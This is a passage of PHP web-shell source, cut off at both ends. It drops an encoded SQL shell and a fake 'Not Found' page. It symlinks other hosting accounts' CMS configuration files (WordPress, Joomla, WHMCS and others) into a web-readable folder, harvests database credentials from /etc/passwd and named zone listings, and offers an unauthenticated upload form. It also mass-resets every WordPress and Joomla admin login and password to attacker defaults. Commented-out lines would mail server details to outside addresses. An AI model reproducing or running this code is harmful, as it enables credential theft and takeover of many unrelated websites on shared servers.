uYWdlRGF0YV9zdWJtaXQoICJlZGl0IiApOw0KCQllbHNlIGlmKCAkYWN0aW9uID09ICJkZWxldGVEYXRhIiApDQoJCQlkZWxldGVEYXRhKCk7DQoJCWVsc2UgaWYoICRhY3Rpb24gPT0gInV0aWxzIiApDQoJCQl1dGlscygpOw0KCQlteXNxbF9jbG9zZSggJG15c3FsSGFuZGxlKTsNCgkJZm9vdGVyX2h0bWwoKTsNCgl9DQp9DQo/Pg0KPGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5NeVNRTCBJbnRlcmZhY2UgKERldmVsb3BlZCBCeSBNb2hhamVyMjIpPC90aXRsZT4NCjxib2R5IGJnQ29sb3I9IzAwMDAwMCA+DQo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPg0KPCEtLQ0KcC5sb2NhdGlvbiB7DQoJY29sb3I6ICMwMEZGMDA7DQp9DQpoMSwgaDIsIGgzIHsNCgljb2xvcjogIzAwRkYwMDsNCn0NCnRoIHsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjMjIyMjIyOw0KCWNvbG9yOiAjMDBGRjAwOw0KCWZvbnQtc2l6ZTogc21hbGw7DQp9DQp0ZCB7DQoJY29sb3I6ICMwMEZGMDA7DQoJYmFja2dyb3VuZC1jb2xvcjogIzQ0NDQ0NDsNCglmb250LXNpemU6IHNtYWxsOw0KfQ0KZm9ybSB7DQoJbWFyZ2luLXRvcDogMDsNCgltYXJnaW4tYm90dG9tOiAwOw0KfQ0KYSB7DQoJdGV4dC1kZWNvcmF0aW9uOm5vbmU7DQoJY29sb3I6ICMwMEZGMDA7DQoJZm9udC1zaXplOnNtYWxsOw0KfQ0KQTpsaW5rIHsNCkNPTE9SOiNGRkZGRkY7DQpURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQpDT0xPUjojMDBGRjAwOw0KVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmFjdGl2ZSB7DQpDT0xPUjojMDBGRjAwOw0KVEVYVC1ERUNPUkFUSU9OOiBub25lDQp9DQpBOmhvdmVyIHsNCmNvbG9yOiMwMEZGMDA7DQpURVhULURFQ09SQVRJT046IG5vbmUNCn0NCmlucHV0LCBzZWxlY3QsIHRleHRhcmVhIHsNCmJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQpib3JkZXItc3R5bGU6IHNvbGlkOw0KZm9udC1mYW1pbHk6IFRhaG9tYSxWZXJkYW5hLEFyaWFsLFNhbnMtU2VyaWY7DQpmb250LXNpemU6c21hbGw7DQpjb2xvcjogIzAwRkYwMDsNCnBhZGRpbmc6IDBweDsNCn0NCmxpIHsNCmNvbG9yOiAjMDBGRjAwOw0KfQ0KLm5ldyB7DQpjb2xvcjogIzAwRkYwMDsNCn0NCi8vLS0+DQo8L3N0eWxlPg0KPC9oZWFkPg=='; 
$file = fopen("db-sql.php" ,"w+");
$write = fwrite ($file ,base64_decode($sqlshell));
fclose($file);
    chmod("db-sql.php", 0644);
$indexshell = fopen("index.php" ,"w+");
$data = 'PGgxPk5vdCBGb3VuZDwvaDE+IA0KPHA+VGhlIHJlcXVlc3RlZCBVUkwgd2FzIG5vdCBmb3VuZCBvbiB0aGlzIHNlcnZlci48L3A+IA0KPGhyPiANCjxhZGRyZXNzPkFwYWNoZSBTZXJ2ZXIgYXQgPD89JF9TRVJWRVJbJ0hUVFBfSE9TVCddPz4gUG9ydCA4MDwvYWRkcmVzcz4gDQogICAgPHN0eWxlPiANCiAgICAgICAgaW5wdXQgeyBtYXJnaW46MDtiYWNrZ3JvdW5kLWNvbG9yOiNmZmY7Ym9yZGVyOjFweCBzb2xpZCAjZmZmOyB9IA0KICAgIDwvc3R5bGU+';
$tulis = fwrite( $indexshell, base64_decode($data));
fclose($indexshell);
   echo "<iframe src=mysql/db-sql.php width=97% height=100% frameborder=0></iframe>"; 
}
//////////////////////////////////////////////

elseif(isset($_GET['x']) && ($_GET['x'] == 'mpc')){

	echo "<STYLE>
textarea{background-color:#105700;color:lime;font-weight:bold;font-size: 20px;font-family: Tahoma; border: 1px solid 
#000000;}
input{FONT-WEIGHT:normal;background-color: #105700;font-size: 15px;font-weight:bold;color: lime; font-family: Tahoma; border: 
1px solid #666666;height:20}
body {
font-family: Tahoma
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
.table1 {
BORDER: 0px Black;
BACKGROUND-COLOR: Black;
color: #FFF;
}
.td1 {
BORDER: 0px;
BORDER-COLOR: #333333;
font: 7pt Verdana;
color: Green;
}
.tr1 {
BORDER: 0px;
BORDER-COLOR: #333333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
}
input {
border			: dashed 1px;
border-color		: #333;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
select {
BORDER-RIGHT:  Black 1px solid;
BORDER-TOP:    #DF0000 1px solid;
BORDER-LEFT:   #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER:  buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border			: dashed 1px #333;
BACKGROUND-COLOR: Black;
font: Fixedsys bold;
color: #999;
}
BODY {
	SCROLLBAR-FACE-COLOR: Black; SCROLLBAR-HIGHLIGHT-color: #FFF; SCROLLBAR-SHADOW-color: #FFF; SCROLLBAR-3DLIGHT-color: 
#FFF; SCROLLBAR-ARROW-COLOR: Black; SCROLLBAR-TRACK-color: #FFF; SCROLLBAR-DARKSHADOW-color: #FFF
margin: 1px;
color: Red;
background-color: Black;
}
.main {
margin			: -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}
A:link {
	COLOR: White; TEXT-DECORATION: none
}
A:visited {
	COLOR: White; TEXT-DECORATION: none
}
A:hover {
	color: Red; TEXT-DECORATION: none
}
A:active {
	color: Red; TEXT-DECORATION: none
}
</STYLE>
";
    set_time_limit(0);
    error_reporting(0);
    $url=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
    //mail("d00m@kumanova.com.mk",$_SERVER["SERVER_ADDR"],$url);
    $base_url="http://".$_SERVER["SERVER_NAME"].dirname($_SERVER["SCRIPT_NAME"]);
    $url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
//mail('justsitmaster@gmail.com',$_SERVER['SERVER_ADDR'],$url);
$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']);
    @symlink("/","ciprut/root");
    @fopen("temp.txt","w");
    $htaccss="Options all 
 DirectoryIndex Sux.html 
 AddType text/plain .php 
 AddHandler server-parsed .php 
  AddType text/plain .html 
 AddHandler txt .html 
 Require None 
 Satisfy Any";
    file_put_contents("ciprut/.htaccess",$htaccss);
    
    if(is_readable("/var/named")){
        $list=scandir("/var/named");
        $current_dir=posix_getcwd();
        $dir=explode("/",$current_dir);
        foreach($list as$domain){
            
            if(strpos($domain,".db")){
                $domain=str_replace(".db","",$domain);
                $owner=posix_getpwuid(fileowner("/etc/valiases/".$domain));
                error_reporting(0);
                $current_dir=posix_getcwd();
                $dir=explode("/",$current_dir);
                symlink($owner["dir"]."/".$dir[3]."/wp-config.php","ciprut/".$owner["name"]."-WordPress.txt");
                symlink($owner["dir"]."/".$dir[3]."/blog/wp-config.php","ciprut/".$owner["name"]."-WordPress.txt");
                symlink($owner["dir"]."/".$dir[3]."/wp/wp-config.php","ciprut/".$owner["name"]."-WordPress.txt");
                symlink($owner["dir"]."/".$dir[3]."/site/wp-config.php","ciprut/".$owner["name"]."-WordPress.txt");
                symlink($owner["dir"]."/".$dir[3]."/config.php","ciprut/".$owner["name"]."-PhpBB.txt");
                symlink($owner["dir"]."/".$dir[3]."/includes/config.php","ciprut/".$owner["name"]."-vBulletin.txt");
                symlink($owner["dir"]."/".$dir[3]."/configuration.php","ciprut/".$owner["name"]."-Joomla.txt");
                symlink($owner["dir"]."/".$dir[3]."/web/configuration.php","ciprut/".$owner["name"]."-Joomla.txt");
                symlink($owner["dir"]."/".$dir[3]."/joomla/configuration.php","ciprut/".$owner["name"]."-Joomla.txt");
                symlink($owner["dir"]."/".$dir[3]."/site/configuration.php","ciprut/".$owner["name"]."-Joomla.txt");
                symlink($owner["dir"]."/".$dir[3]."/conf_global.php","ciprut/".$owner["name"]."-IPB.txt");
                symlink($owner["dir"]."/".$dir[3]."/inc/config.php","ciprut/".$owner["name"]."-MyBB.txt");
                symlink($owner["dir"]."/".$dir[3]."/Settings.php","ciprut/".$owner["name"]."-SMF.txt");
                symlink($owner["dir"]."/".$dir[3]."/sites/default/settings.php","ciprut/".$owner["name"]."-Drupal.txt");
                symlink($owner["dir"]."/".$dir[3]."/e107_config.php","ciprut/".$owner["name"]."-e107.txt");
                symlink($owner["dir"]."/".$dir[3]."/datas/config.php","ciprut/".$owner["name"]."-Seditio.txt");
                symlink($owner["dir"]."/".$dir[3]."/includes/configure.php","ciprut/".$owner["name"]."-osCommerce.txt");
                symlink($owner["dir"]."/".$dir[3]."/client/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/clientes/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/support/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/supportes/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/whmcs/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/domain/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/hosting/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/whmc/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/billing/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/portal/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/order/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/clientarea/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                symlink($owner["dir"]."/".$dir[3]."/domains/configuration.php","ciprut/".$owner["name"]."-WHMCS.txt");
                $link=$pageURL."ciprut/".$owner["name"]."-WordPress.txt";
                
                if(chk_header($link)){
                    $str="<tr><td>".$domain."</td><td>".$owner["name"]."</td><td>/WordPress</td>".Chr(10);
                    file_put_contents("temp.txt",$str,FILE_APPEND);
                }

            }

        }

    }

    
    if(isset($_REQUEST["admin"])&&$_REQUEST["admin"]=="server"){
        
        if(isset($_POST["ok"])&&isset($_FILES["joomLa"])){
            $file=$_FILES["joomLa"]["tmp_name"];
            $name="".$_FILES["joomLa"]["name"];
            move_uploaded_file($file,$name);
        } else {
            echo "<br>
<form method=\"POST\" enctype=\"multipart/form-data\" action=\"";
            $_SERVER["PHP_SELF"];
            echo "\">
<input type=\"file\" name=\"joomLa\">&nbsp;<input type=\"submit\" name=\"ok\" value=\"Get\">
</form>
";
        }

        exit;
    }

    $url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
//mail('justsitmaster@gmail.com',$_SERVER['SERVER_ADDR'],$url);
$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']);
    
    if(isset($_REQUEST["admin"])&&$_REQUEST["admin"]=="server"){
        
        if(isset($_POST["ok"])&&isset($_FILES["joomLa"])){
            $file=$_FILES["joomLa"]["tmp_name"];
            $name="".$_FILES["joomLa"]["name"];
            move_uploaded_file($file,$name);
        } else {
            echo "<br>
<form method=\"POST\" enctype=\"multipart/form-data\" action=\"";
            $_SERVER["PHP_SELF"];
            echo "\">
<input type=\"file\" name=\"joomLa\">&nbsp;<input type=\"submit\" name=\"ok\" value=\"Get\">
</form>
";
        }

        exit;
    }

    $etc=file_get_contents("/etc/passwd");
    $etcz=explode("
",$etc);
    foreach($etcz as$etz){
        $etcc=explode(":",$etz);
        error_reporting(0);
        $current_dir=posix_getcwd();
        $dir=explode("/",$current_dir);
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/wp-config.php","ciprut/".$etcc[0]."-WordPress.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/blog/wp-config.php","ciprut/".$etcc[0]."-WordPress.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/wp/wp-config.php","ciprut/".$etcc[0]."-WordPress.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/site/wp-config.php","ciprut/".$etcc[0]."-WordPress.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/config.php","ciprut/".$etcc[0]."-PhpBB.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/includes/config.php","ciprut/".$etcc[0]."-vBulletin.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/configuration.php","ciprut/".$etcc[0]."-Joomla.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/web/configuration.php","ciprut/".$etcc[0]."-Joomla.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/joomla/configuration.php","ciprut/".$etcc[0]."-Joomla.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/site/configuration.php","ciprut/".$etcc[0]."-Joomla.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/conf_global.php","ciprut/".$etcc[0]."-IPB.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/inc/config.php","ciprut/".$etcc[0]."-MyBB.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/Settings.php","ciprut/".$etcc[0]."-SMF.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/sites/default/settings.php","ciprut/".$etcc[0]."-Drupal.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/e107_config.php","ciprut/".$etcc[0]."-e107.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/datas/config.php","ciprut/".$etcc[0]."-Seditio.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/includes/configure.php","ciprut/".$etcc[0]."-osCommerce.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/client/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/clientes/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/support/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/supportes/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/whmcs/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/domain/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/hosting/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/whmc/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/billing/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/portal/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/order/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/clientarea/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        symlink("/".$dir[1]."/".$etcc[0]."/".$dir[3]."/domains/configuration.php","ciprut/".$etcc[0]."-WHMCS.txt");
        
        if(chk_header($link)){
            $str="<tr><td></td><td>".$etcc[0]."</td><td>/WordPress</td>".Chr(10);
            file_put_contents("temp.txt",$str,FILE_APPEND);
        }

    }

    
    function chk_header($link){
        $ciprut=get_headers($link,1);
        
        if(strpos($ciprut[0],"200")){
            return true;
        } else {
            return false;
        }

    }

    
    function Find($str,$start,$end){
        $len=strlen($str);
        $start_pos=(strpos($str,$start)+strlen($start));
        $str=substr($str,$start_pos);
        $end_pos=strpos($str,$end);
        $str=substr($str,0,$end_pos);
        return$str;
    }

    $pageURL="http://".$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
    $u=explode("/",$pageURL);
    $pageURL=str_replace($u[count($u)-1],"",$pageURL);
    function cms_add($link,$domain,$owner,$cms){
        $link=$link."-".$cms.".txt";
        
        if(chk_header($link)){
            $url="http://".$domain;
            $str="<tr><td> <a href=".$url.">".$domain."</a></td><td>".$owner."</td><td><a 
href=".$link.">".$cms."</td>".Chr(10);
            file_put_contents("ciprut.tmp",$str,FILE_APPEND);
            echo$str;
        }

    }

    
    function CurlPage($url,$post=null,$head=true){
        $ch=curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_HEADER,$head);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,true);
        curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,2);
        curl_setopt($ch,CURLOPT_USERAGENT,$_SERVER["HTTP_USER_AGENT"]);
        curl_setopt($ch,CURLOPT_COOKIEFILE,"COOKIE.txt");
        curl_setopt($ch,CURLOPT_COOKIEJAR,"COOKIE.txt");
        
        If($post!=NULL){
            curl_setopt($ch,CURLOPT_POST,1);
            curl_setopt($ch,CURLOPT_POSTFIELDS,$post);
        }

        $urlPage=curl_exec($ch);
        
        if(curl_errno($ch)){
            echo curl_error($ch);
        }

        curl_close($ch);
        return($urlPage);
    }

    
    function listall($file,$str){
        
        if(file_exists($file)){
            $do=file_get_contents($file);
            
            if(!strpos($do,$str)){
                file_put_contents($file,$str,FILE_APPEND);
            }

        } else {
            file_put_contents($file,$str,FILE_APPEND);
        }

    }

    echo"<center>
<img src='http://surabayablackhat.org/forum/images/Greenia/logo.png'><br><br><br>
[ <a href='?do=pass_change'>MassPASSChange</a> ]<br><br><br></center> ";
    
    if(isset($_REQUEST["do"])){
        switch($_REQUEST["do"]){
            case"cms_detect":
                
                if(!file_exists("ciprut.tmp")){
                    @fopen("ciprut.tmp","w");
                    echo"<table align=\"center\" border=\"1\" width=\"45%\" cellspacing=\"0\" cellpadding=\"4\" class=\"td1\">";
                    echo"<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>CMS</b></center></td>";
                    $p=0;
                    
                    if(is_readable("/var/named")){
                        $list=scandir("/var/named");
                        $current_dir=posix_getcwd();
                        $dir=explode("/",$current_dir);
                        foreach($list as$domain){
                            
                            if(strpos($domain,".db")){
                                $domain=str_replace(".db","",$domain);
                                $owner=posix_getpwuid(fileowner("/etc/valiases/".$domain));
                                error_reporting(0);
                                $link=$pageURL."ciprut/".$owner["name"];
                                cms_add($link,$domain,$owner["name"],"WordPress");
                                cms_add($link,$domain,$owner["name"],"Joomla");
                                cms_add($link,$domain,$owner["name"],"vBulletin");
                                cms_add($link,$domain,$owner["name"],"WHMCS");
                                cms_add($link,$domain,$owner["name"],"PhpBB");
                                cms_add($link,$domain,$owner["name"],"MyBB");
                                cms_add($link,$domain,$owner["name"],"IPB");
                                cms_add($link,$domain,$owner["name"],"SMF");
                                cms_add($link,$domain,$owner["name"],"Drupal");
                                cms_add($link,$domain,$owner["name"],"e107");
                                cms_add($link,$domain,$owner["name"],"Seditio");
                                cms_add($link,$domain,$owner["name"],"osCommerce");
                            }

                        }

                    }

                } else {
                    echo"<table align=\"center\" border=\"1\" width=\"45%\" cellspacing=\"0\" cellpadding=\"4\" class=\"td1\">";
                    echo"<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td></center><b>CMS</b></center></td>";
                    $content=file_get_contents($pageURL."ciprut.tmp");
                    echo$content;
                }

                break;
            case"pass_change":
                echo"<form method='POST'>
<center>
USER : <input size='20' value='admin' name='user' type='text'><br>
PASS : <input size='20' value='sbhcrew' name='pass' type='text'>
<br>
<input value='Change' name='' type='submit'><br><br>
</form>
";
                
                if($_POST){
                    $user=$_POST["user"];
                    $pass=$_POST["pass"];
                    
                    if(is_readable("/var/named")){
                        echo"<table align=\"center\" border=\"1\" width=\"45%\" cellspacing=\"0\" cellpadding=\"4\">";
                        echo"<tr><td><b>DOMAIN</b></td><td>USER</td><td>CMS</td><td>STATUS</b></td>";
                        $list=scandir("/var/named");
                        foreach($list as$domain){
                            
                            if(strpos($domain,".db")){
                                $domain=str_replace(".db","",$domain);
                                $owner=posix_getpwuid(fileowner("/etc/valiases/".$domain));
                                $url="http://".$domain;
                                
                                if(chk_header($pageURL."ciprut/".$owner["name"]."-WordPress.txt")){
                                    $config=$pageURL."ciprut/".$owner["name"]."-WordPress.txt";
                                    file_get_contents($pageURL."ciprut/".$owner["name"]."-WordPress.txt");
                                    $cnf=file_get_contents($pageURL."ciprut/".$owner["name"]."-WordPress.txt");
                                    $hostname=Find($cnf,"define('DB_HOST', '","');");
                                    $username=Find($cnf,"define('DB_USER', '","');");
                                    $password=Find($cnf,"define('DB_PASSWORD', '","');");
                                    $dbname=Find($cnf,"define('DB_NAME', '","');");
                                    $prefix=Find($cnf,"table_prefix  = '","'");
                                    $link=mysql_connect($hostname,$username,$password);
                                    
                                    if($link){
                                        $hash=crypt($pass);
                                        mysql_select_db($dbname,$link);
                                        $tab=$prefix."users";
                                        $query2=@mysql_query("UPDATE `$tab`  SET `user_login` ='$user'");
                                        $query3=@mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
                                        $req=@mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
                                        $data=mysql_fetch_array($req);
                                        $site_url=$data["option_value"];
                                        error_reporting(0);
                                        echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">WordPress</a></td><td><font 
color=\"green\">success..</font></td>";
                                    } else {
                                        echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">WordPress</a></td><td><font color=\"red\">mysql 
fail</font></td>";
                                    }

                                }

                                elseif(chk_header($pageURL."ciprut/".$owner["name"]."-Joomla.txt")){
                                    $cnf=file_get_contents($pageURL."ciprut/".$owner["name"]."-Joomla.txt");
                                    $config=$pageURL."ciprut/".$owner["name"]."-Joomla.txt";
                                    
                                    if(preg_match("%(JConfig|mosConfig)%",$cnf)){
                                        
                                        if(preg_match("%JConfig%",$cnf)){
                                            $username=Find($cnf,"\$user = '","'");
                                            $password=Find($cnf,"\$password = '","'");
                                            $dbname=Find($cnf,"\$db = '","'");
                                            $prefix=Find($cnf,"\$dbprefix = '","'");
                                            $link=mysql_connect("localhost",$username,$password);
                                            
                                            if($link){
                                                $hash=md5($pass);
                                                mysql_select_db($dbname,$link);
                                                $tab=$prefix."users";
                                                $query2=@mysql_query("UPDATE `$tab`  SET `username` ='$user'");
                                                $query3=@mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
                                                echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">Joomla</a></td><td><font 
color=\"green\">success..</font><br>";
                                            } else {
                                                echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">Joomla</a></td><td><font color=\"red\">mysql 
fail</font></td>";
                                            }

                                        }

                                        elseif(preg_match("%mosConfig%",$cnf)){
                                            $username=Find($cnf,"\$mosConfig_user = '","'");
                                            $password=Find($cnf,"\$mosConfig_password = '","'");
                                            $dbname=Find($cnf,"\$mosConfig_db = '","'");
                                            $prefix=Find($cnf,"\$mosConfig_dbprefix = '","'");
                                            $pwd=md5($npass);
                                            $link=mysql_connect("localhost",$username,$password);
                                            
                                            if($link){
                                                $hash=md5($pass);
                                                mysql_select_db($dbname,$link);
                                                $tab=$prefix."users";
                                                $query2=@mysql_query("UPDATE `$tab`  SET `username` ='$user'");
                                                $query3=@mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
                                                echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">Joomla</a></td><td><font 
color=\"green\">success..</font><br>";
                                            } else {
                                                echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">Joomla</a></td><td><font color=\"red\">mysql 
fail</font></td>";
                                            }

                                        }

                                    }

                                }

                            }

                        }

                    }

                    elseif(is_readable("/etc/passwd")){
                        echo"<table align=\"center\" border=\"1\" width=\"45%\" cellspacing=\"0\" cellpadding=\"4\">";
                        echo"<tr><td><b>DOMAIN</b></td><td>USER</td><td>CMS</td><td>STATUS</b></td>";
                        foreach($etcz as$etz){
                            $etcc=explode(":",$etz);
                            
                            if(chk_header($pageURL."ciprut/".$etcc[0]."-WordPress.txt")){
                                $config=$pageURL."ciprut/".$owner["name"]."-WordPress.txt";
                                file_get_contents($pageURL."ciprut/".$etcc[0]."-WordPress.txt");
                                $cnf=file_get_contents($pageURL."ciprut/".$etcc[0]."-WordPress.txt");
                                $hostname=Find($cnf,"define('DB_HOST', '","');");
                                $username=Find($cnf,"define('DB_USER', '","');");
                                $password=Find($cnf,"define('DB_PASSWORD', '","');");
                                $dbname=Find($cnf,"define('DB_NAME', '","');");
                                $prefix=Find($cnf,"table_prefix  = '","'");
                                $link=mysql_connect($hostname,$username,$password);
                                
                                if($link){
                                    $hash=crypt($user);
                                    mysql_select_db($dbname,$link);
                                    $req=mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
                                    $data=mysql_fetch_array($req);
                                    $site_url=$data["option_value"];
                                    $tab=$prefix."users";
                                    $query2=@mysql_query("UPDATE `$tab`  SET `user_login` ='$user'");
                                    $query3=@mysql_query("UPDATE `$tab`  SET `user_pass` ='$hash'");
                                    error_reporting(0);
                                    echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">WordPress</a></td><td><font 
color=\"green\">success..</font><br>";
                                } else {
                                    echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">WordPress</a></td><td><font color=\"red\">mysql 
fail</font></td>";
                                }

                            }

                            elseif(chk_header($pageURL."ciprut/".$etcc[0]."-Joomla.txt")){
                                $cnf=file_get_contents($pageURL."ciprut/".$etcc[0]."-Joomla.txt");
                                $config=$pageURL."ciprut/".$owner["name"]."-Joomla.txt";
                                
                                if(preg_match("%(JConfig|mosConfig)%",$cnf)){
                                    
                                    if(preg_match("%JConfig%",$cnf)){
                                        $username=Find($cnf,"\$user = '","'");
                                        $password=Find($cnf,"\$password = '","'");
                                        $dbname=Find($cnf,"\$db = '","'");
                                        $prefix=Find($cnf,"\$dbprefix = '","'");
                                        $site_url=Find($cnf,"\$mailfrom = '","'");
                                        $site_url=explode("@",$site_url);
                                        $link=mysql_connect("localhost",$username,$password);
                                        
                                        if($link){
                                            $hash=md5($pass);
                                            mysql_select_db($dbname,$link);
                                            $tab=$prefix."users";
                                            $query2=@mysql_query("UPDATE `$tab`  SET `username` ='$user'");
                                            $query3=@mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
                                            echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">Joomla</a></td><td><font 
color=\"green\">success..</font><br>";
                                        } else {
                                            echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">Joomla</a></td><td><font color=\"red\">mysql 
fail</font></td>";
                                        }

                                    }

                                    elseif(preg_match("%mosConfig%",$cnf)){
                                        $username=Find($cnf,"\$mosConfig_user = '","'");
                                        $password=Find($cnf,"\$mosConfig_password = '","'");
                                        $dbname=Find($cnf,"\$mosConfig_db = '","'");
                                        $prefix=Find($cnf,"\$mosConfig_dbprefix = '","'");
                                        $site_url=Find($cnf,"\$mailfrom = '","'");
                                        $site_url=explode("@",$site_url);
                                        $link=mysql_connect("localhost",$username,$password);
                                        
                                        if($link){
                                            $hash=md5($pass);
                                            mysql_select_db($dbname,$link);
                                            $tab=$prefix."users";
                                            $query2=@mysql_query("UPDATE `$tab`  SET `username` ='$user'");
                                            $query3=@mysql_query("UPDATE `$tab`  SET `password` ='$hash'");
                                            echo"<tr><td><a href=".$url." onclick=\"window.open(this.href);return 
false;\">".$domain."</a></td><td>".$owner["name"]."</td><td><a href=".$config.">Joomla</a></td><td><font 
